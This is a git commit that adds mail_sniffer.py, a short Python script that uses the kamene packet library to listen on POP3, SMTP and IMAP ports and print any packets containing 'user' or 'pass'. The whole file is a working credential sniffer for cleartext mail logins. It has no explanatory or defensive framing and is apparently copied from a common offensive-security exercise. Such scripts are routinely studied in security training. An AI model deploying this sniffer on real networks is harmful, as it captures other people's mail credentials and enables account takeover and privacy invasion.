91afc85506269f24ca4b6f756d04486a04166945
Daniel Onibokun <idanieloni@gmail.com>
2022-09-30 12:10:33 -0400

    Add files via upload

---
+++ mail_sniffer.py
@@ -0,0 +1,19 @@
+from kamene.all import *
+
+# our packet callback
+def packet_callback(packet):
+    if packet[TCP].payload:
+        mail_packet = bytes(packet[TCP].payload)
+        if b'user' in mail_packet.lower() or b'pass' in mail_packet.lower():
+            print("[*] Server: %s" % packet[IP].dst)
+            print("[*] %s" % packet[TCP].payload)
+
+
+# fire up our sniffer
+def main():
+    sniff(filter="tcp port 110 or tcp port 25 or tcp port 143",
+        prn=packet_callback,
+        store=0)
+    
+if __name__ == "__main__":
+    main()
